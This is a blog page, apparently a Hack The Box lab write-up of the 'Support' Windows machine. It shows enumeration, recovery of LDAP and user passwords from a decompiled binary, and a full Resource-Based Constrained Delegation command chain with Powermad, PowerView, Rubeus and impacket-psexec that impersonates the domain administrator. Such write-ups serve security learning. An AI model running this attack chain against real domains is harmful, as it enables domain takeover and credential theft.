@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Support | whoami</title>
+<meta name="keywords" content="">
+<meta name="description" content="Easy Windows">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/htb/support-easy-windows/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/htb/support-easy-windows/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/htb/support-easy-windows/">
+  <meta property="og:site_name" content="whoami">
+  <meta property="og:title" content="Support">
+  <meta property="og:description" content="Easy Windows">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="htb">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Support">
+  <meta name="twitter:description" content="Easy Windows">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Hack The Box",
+      "item": "http://localhost:1313/htb/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Support",
+      "item": "http://localhost:1313/htb/support-easy-windows/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Support",
+  "name": "Support",
+  "description": "Easy Windows",
+  "keywords": [
+    
+  ],
+  "articleBody": "nmap scan 53 - DNS 88 - MS Windows Kerberos 135 - MS Windows RPC 139 - MS Windows netbios-ssn 389 - MS Windows Active Directory LDAP 445 - ? 464 - ? 593 - MS Windows RPC over HTTP 1.0 636 - ? 3268 - MS Windows Active Directory LDAP 3269 - ? 5985 - MS HTTPAPI httpd 2.0 (SSDP/UPnP) 9389 - .NET Message Framing 49664 - MS Windows RPC 49667 - MS Windows RPC 49678 - MS Windows RPC over HTTP 1.0 49683 - MS Windows RPC 49707 - MS Windows RPC running enum4linux on the machine because we have netbios port domain name: SUPPORT domain SID: S-1-5-21-1677581083-3380853377-188903654\nmost of the other information we are getting an ACCESS DENIED\nlooks like we need to find some credentials\nthe following shares are present on the machine (using smbclient -L) support-tools is not a default share\nthe binary file is a .NET executable, as we are on linux there is 2 ways to proceed. Decompile the file or use wine to attempt to run it\nILSpy https://github.com/icsharpcode/AvaloniaILSpy/releases\nUsing ILSpy to look at the binary (decompiled)\nexploring it finds the password encoded - and also the algorithm to decode it\n0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\narmando is the key\nThe executable does an LDAP query and attempts to connect to a remote LDAP server and obtain user information\nadd support.htb to hosts file\nwith the password that we have now nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz, we can attempt to authenticate to the LDAP server\nfrom this query code, we can see that the username is ldap\nldapsearch -x -H ldap://support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b \"dc=support,dc=htb\" info: section looks like it contains a password for support - Ironside47pleasure40Watchful\nWe also see that support is part of the Remote Management Users Group\nWinRM is running on the box - port 5985 running http in nmap scan\nPrivilege Escalation Looked around a bit - but there isn’t much here and I don’t really know what I’m doing - don’t understand enough about how the windows OS works and Active Directory to try do this priv esc\nWill try finish the box with someone’s help at the office and move onto doing a course or something to really learn Windows priv esc and Active Directory attacks\nI’m back.\nConsidering we’ve compromised a domain user, let’s run bloodhound\nbloodhound-python -d support.htb -u support@support.htb -p Ironside47pleasure40Watchful -gc support.htb -c all -ns 10.129.230.181 import the json files into bloodhound for viewing looking to see if there is a path to administrator, we see there is:\nand this is because support@support.htb is part of Shared Support Accounts group which has has GenericAll privileges on DC.SUPPORT.HTB - which is the domain controller and obviously has control of everything including Administrator\nEssentially bloodhound mentions that we can perform a Resource Based Constrained Delegation attack to escalate privileges\nResource-Based Constrained Delegation attack In a nutshell, through a Resource Based Constrained Delegation attack we can add a computer under our control to the domain; let’s call this computer $FAKE-COMP01 , and configure the Domain Controller (DC) to allow $FAKE-COMP01 to act on behalf of it. Then, by acting on behalf of the DC we can request Kerberos tickets for $FAKE-COMP01 , with the ability to impersonate a highly privileged user on the Domain, such as the Administrator . After the Kerberos tickets are generated, we can Pass the Ticket (PtT) and authenticate as this privileged user, giving us control over the entire domain. The attack relies on three prerequisites:\nWe need a shell or code execution as a domain user that belongs to the Authenticated Users group. By default any member of this group can add up to 10 computers to the domain. The ms-ds-machineaccountquota attribute needs to be higher than 0. This attribute controls the amount of computers that authenticated domain users can add to the domain. Our current user or a group that our user is a member of, needs to have WRITE privileges ( GenericAll , WriteDACL ) over a domain joined computer (in this case the Domain Controller). From our previous enumeration we know that the support user is indeed a member of the Authenticated Users group as well as the Shared Support Accounts group. We also know that the Shared Support Accounts group has GenericAll privileges over the Domain Controller ( dc.support.htb ). # Get dependencies for attack # Powermad git clone https://github.com/Kevin-Robertson/Powermad.git cp ~/tools/Powermad/Powermad.ps1 ./Powermad.ps1 # PowerView sudo apt install powersploit cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 ./PowerView.ps1 # Rubeus.exe cp /usr/share/windows-resources/rubeus/Rubeus.exe ./Rubeus.exe # Make sure we are able to add machines - needs to be higher than 0 Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota # With evil-winrm upload Powermad.ps1 upload PowerView.ps1 upload Rubeus.exe # Import powershell modules . ./Powermad.ps1 . ./PowerView.ps1 # Following steps on bloodhound # Create new machine account New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force) # Get SID of the account we just created $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid # Build a generic ACE with our added machine account SID as the principal, and get the binary bytes for the new ACE $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))\" $SDBytes = New-Object byte[] ($SD.BinaryLength) $SD.GetBinaryForm($SDBytes, 0) # Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView in this case: Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} # User Rubeus.exe to hash the plaintext password into its RC4_HMAC form ./Rubeus.exe hash /password:Summer2018! # And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to \"pretend\" to be \"admin\" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER: ./Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt # Copy the last ticket value and save it to ticket.kirbi.b64 in local kali vim ticket.kirbi.b64 # remember to remove spaces base64 -d ticket.kirbi.b64 \u003e ticket.kirbi impacket-ticketConverter ticket.kirbi ticket.ccache KRB5CCNAME=ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass ",
+  "wordCount" : "994",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/htb/support-easy-windows/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "whoami",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="whoami (Alt + H)">whoami</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/htb/" title="HTB">
+                    <span>HTB</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Support
+    </h1>
+    <div class="post-description">
+      Easy Windows
+    </div>
+  </header> 
+  <div class="post-content md-content"><p>nmap scan
+<img alt="Support (Easy Windows).png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29.png"></p>
+<ul>
+<li>53 - DNS</li>
+<li>88 - MS Windows Kerberos</li>
+<li>135 - MS Windows RPC</li>
+<li>139 - MS Windows netbios-ssn</li>
+<li>389 - MS Windows Active Directory LDAP</li>
+<li>445 - ?</li>
+<li>464 - ?</li>
+<li>593 - MS Windows RPC over HTTP 1.0</li>
+<li>636 - ?</li>
+<li>3268 - MS Windows Active Directory LDAP</li>
+<li>3269 - ?</li>
+<li>5985 - MS HTTPAPI httpd 2.0 (SSDP/UPnP)</li>
+<li>9389 - .NET Message Framing</li>
+<li>49664 - MS Windows RPC</li>
+<li>49667 - MS Windows RPC</li>
+<li>49678 - MS Windows RPC over HTTP 1.0</li>
+<li>49683 - MS Windows RPC</li>
+<li>49707 - MS Windows RPC</li>
+</ul>
+<p>running <code>enum4linux</code> on the machine because we have netbios port
+<img alt="Support (Easy Windows)-1.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-1.png"></p>
+<p>domain name: <code>SUPPORT</code>
+domain SID: <code>S-1-5-21-1677581083-3380853377-188903654</code></p>
+<p>most of the other information we are getting an ACCESS DENIED</p>
+<p>looks like we need to find some credentials</p>
+<p>the following shares are present on the machine (using smbclient -L)
+<img alt="Support (Easy Windows)-2.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-2.png"></p>
+<p>support-tools is not a default share</p>
+<p><img alt="Support (Easy Windows)-3.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-3.png"></p>
+<p><img alt="Support (Easy Windows)-4.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-4.png"></p>
+<p><img alt="Support (Easy Windows)-5.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-5.png"></p>
+<p>the binary file is a .NET executable, as we are on linux there is 2 ways to proceed. Decompile the file or use <code>wine</code> to attempt to run it</p>
+<p>ILSpy <a href="https://github.com/icsharpcode/AvaloniaILSpy/releases">https://github.com/icsharpcode/AvaloniaILSpy/releases</a></p>
+<p>Using ILSpy to look at the binary (decompiled)</p>
+<p><img alt="Support (Easy Windows)-6.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-6.png"></p>
+<p>exploring it finds the password encoded - and also the algorithm to decode it</p>
+<p><img alt="Support (Easy Windows)-7.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-7.png"></p>
+<p><code>0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E</code></p>
+<p><img alt="Support (Easy Windows)-8.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-8.png"></p>
+<p><code>armando</code> is the key</p>
+<p><img alt="Support (Easy Windows)-10.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-10.png"></p>
+<p><img alt="Support (Easy Windows)-9.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-9.png"></p>
+<p>The executable does an LDAP query and attempts to connect to a remote LDAP server and obtain user information</p>
+<p>add support.htb to hosts file</p>
+<p><img alt="Support (Easy Windows)-11.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-11.png"></p>
+<p>with the password that we have now <code>nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</code>, we can attempt to authenticate to the LDAP server</p>
+<p>from this query code, we can see that the username is <code>ldap</code></p>
+<p><img alt="Support (Easy Windows)-12.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-12.png"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -H ldap://support.htb -D ldap@support.htb -w <span class="s1">&#39;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#39;</span> -b <span class="s2">&#34;dc=support,dc=htb&#34;</span>
+</span></span></code></pre></div><p><img alt="Support (Easy Windows)-13.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-13.png"></p>
+<p><img alt="Support (Easy Windows)-14.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-14.png"></p>
+<p><img alt="Support (Easy Windows)-15.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-15.png"></p>
+<p>info: section looks like it contains a password for <code>support</code> - <code>Ironside47pleasure40Watchful</code></p>
+<p>We also see that <code>support</code> is part of the <code>Remote Management Users</code> Group</p>
+<p><img alt="Support (Easy Windows)-16.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-16.png"></p>
+<p>WinRM is running on the box - port 5985 running http in nmap scan</p>
+<p><img alt="Support (Easy Windows)-17.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-17.png"></p>
+<h2 id="privilege-escalation">Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h2>
+<p>Looked around a bit - but there isn&rsquo;t much here and I don&rsquo;t really know what I&rsquo;m doing - don&rsquo;t understand enough about how the windows OS works and Active Directory to try do this priv esc</p>
+<p>Will try finish the box with someone&rsquo;s help at the office and move onto doing a course or something to really learn Windows priv esc and Active Directory attacks</p>
+<p>I&rsquo;m back.</p>
+<p>Considering we&rsquo;ve compromised a domain user, let&rsquo;s run bloodhound</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodhound-python -d support.htb -u support@support.htb -p Ironside47pleasure40Watchful -gc support.htb -c all -ns 10.129.230.181
+</span></span></code></pre></div><p><img alt="Support (Easy Windows)-18.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-18.png"></p>
+<p>import the json files into bloodhound for viewing
+<img alt="Support (Easy Windows)-19.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-19.png"></p>
+<p>looking to see if there is a path to administrator, we see there is:</p>
+<p><img alt="Support (Easy Windows)-20.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-20.png"></p>
+<p>and this is because <a href="mailto:support@support.htb">support@support.htb</a> is part of Shared Support Accounts group which has has GenericAll privileges on DC.SUPPORT.HTB - which is the domain controller and obviously has control of everything including Administrator</p>
+<p><img alt="Support (Easy Windows)-21.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-21.png">
+<img alt="Support (Easy Windows)-22.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-22.png"></p>
+<p>Essentially bloodhound mentions that we can perform a Resource Based Constrained Delegation attack to escalate privileges</p>
+<h1 id="resource-based-constrained-delegation-attack">Resource-Based Constrained Delegation attack<a hidden class="anchor" aria-hidden="true" href="#resource-based-constrained-delegation-attack">#</a></h1>
+<p>In a nutshell, through a Resource Based Constrained Delegation attack we can add a computer under our control to the domain; let&rsquo;s call this computer $FAKE-COMP01 , and configure the Domain Controller (DC) to allow $FAKE-COMP01 to act on behalf of it. Then, by acting on behalf of the DC we can request Kerberos tickets for $FAKE-COMP01 , with the ability to impersonate a highly privileged user on the Domain, such as the Administrator . After the Kerberos tickets are generated, we can Pass the Ticket (PtT) and authenticate as this privileged user, giving us control over the entire domain. The attack relies on three prerequisites:</p>
+<ul>
+<li>We need a shell or code execution as a domain user that belongs to the Authenticated Users group. By default any member of this group can add up to 10 computers to the domain.</li>
+<li>The ms-ds-machineaccountquota attribute needs to be higher than 0. This attribute controls the amount of computers that authenticated domain users can add to the domain.</li>
+<li>Our current user or a group that our user is a member of, needs to have WRITE privileges ( GenericAll , WriteDACL ) over a domain joined computer (in this case the Domain Controller).
+From our previous enumeration we know that the support user is indeed a member of the Authenticated Users group as well as the Shared Support Accounts group. We also know that the Shared Support Accounts group has GenericAll privileges over the Domain Controller ( dc.support.htb ).</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get dependencies for attack</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Powermad</span>
+</span></span><span class="line"><span class="cl">git clone https://github.com/Kevin-Robertson/Powermad.git
+</span></span><span class="line"><span class="cl">cp ~/tools/Powermad/Powermad.ps1 ./Powermad.ps1
+</span></span><span class="line"><span class="cl"><span class="c1"># PowerView</span>
+</span></span><span class="line"><span class="cl">sudo apt install powersploit
+</span></span><span class="line"><span class="cl">cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 ./PowerView.ps1
+</span></span><span class="line"><span class="cl"><span class="c1"># Rubeus.exe</span>
+</span></span><span class="line"><span class="cl">cp /usr/share/windows-resources/rubeus/Rubeus.exe ./Rubeus.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Make sure we are able to add machines - needs to be higher than 0</span>
+</span></span><span class="line"><span class="cl">Get-ADObject -Identity <span class="o">((</span>Get-ADDomain<span class="o">)</span>.distinguishedname<span class="o">)</span> -Properties ms-DS-MachineAccountQuota
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># With evil-winrm</span>
+</span></span><span class="line"><span class="cl">upload Powermad.ps1
+</span></span><span class="line"><span class="cl">upload PowerView.ps1
+</span></span><span class="line"><span class="cl">upload Rubeus.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Import powershell modules</span>
+</span></span><span class="line"><span class="cl">. ./Powermad.ps1
+</span></span><span class="line"><span class="cl">. ./PowerView.ps1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Following steps on bloodhound</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Create new machine account</span>
+</span></span><span class="line"><span class="cl">New-MachineAccount -MachineAccount attackersystem -Password <span class="k">$(</span>ConvertTo-SecureString <span class="s1">&#39;Summer2018!&#39;</span> -AsPlainText -Force<span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Get SID of the account we just created</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ComputerSid</span> <span class="o">=</span> Get-DomainComputer attackersystem -Properties objectsid <span class="p">|</span> Select -Expand objectsid
+</span></span><span class="line"><span class="cl"><span class="c1"># Build a generic ACE with our added machine account SID as the principal, and get the binary bytes for the new ACE</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$SD</span> <span class="o">=</span> New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="s2">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span><span class="k">$(</span><span class="nv">$ComputerSid</span><span class="k">)</span><span class="s2">)&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$SDBytes</span> <span class="o">=</span> New-Object byte<span class="o">[]</span> <span class="o">(</span><span class="nv">$SD</span>.BinaryLength<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$SD</span>.GetBinaryForm<span class="o">(</span><span class="nv">$SDBytes</span>, 0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we&#39;re taking over, again using PowerView in this case:</span>
+</span></span><span class="line"><span class="cl">Get-DomainComputer <span class="nv">$TargetComputer</span> <span class="p">|</span> Set-DomainObject -Set @<span class="o">{</span><span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span class="o">=</span><span class="nv">$SDBytes</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># User Rubeus.exe to hash the plaintext password into its RC4_HMAC form</span>
+</span></span><span class="line"><span class="cl">./Rubeus.exe <span class="nb">hash</span> /password:Summer2018!
+</span></span><span class="line"><span class="cl"><span class="c1"># And finally we can use Rubeus&#39; *s4u* module to get a service ticket for the service name (sname) we want to &#34;pretend&#34; to be &#34;admin&#34; for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:</span>
+</span></span><span class="line"><span class="cl">./Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Copy the last ticket value and save it to ticket.kirbi.b64 in local kali</span>
+</span></span><span class="line"><span class="cl">vim ticket.kirbi.b64 <span class="c1"># remember to remove spaces</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">base64 -d ticket.kirbi.b64 &gt; ticket.kirbi
+</span></span><span class="line"><span class="cl">impacket-ticketConverter ticket.kirbi ticket.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">KRB5CCNAME</span><span class="o">=</span>ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
+</span></span></code></pre></div><p><img alt="Support (Easy Windows)-23.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-23.png"></p>
+<p><img alt="Support (Easy Windows)-24.png" loading="lazy" src="/htb/support-easy-windows/Support%20%28Easy%20Windows%29-24.png"></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">whoami</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
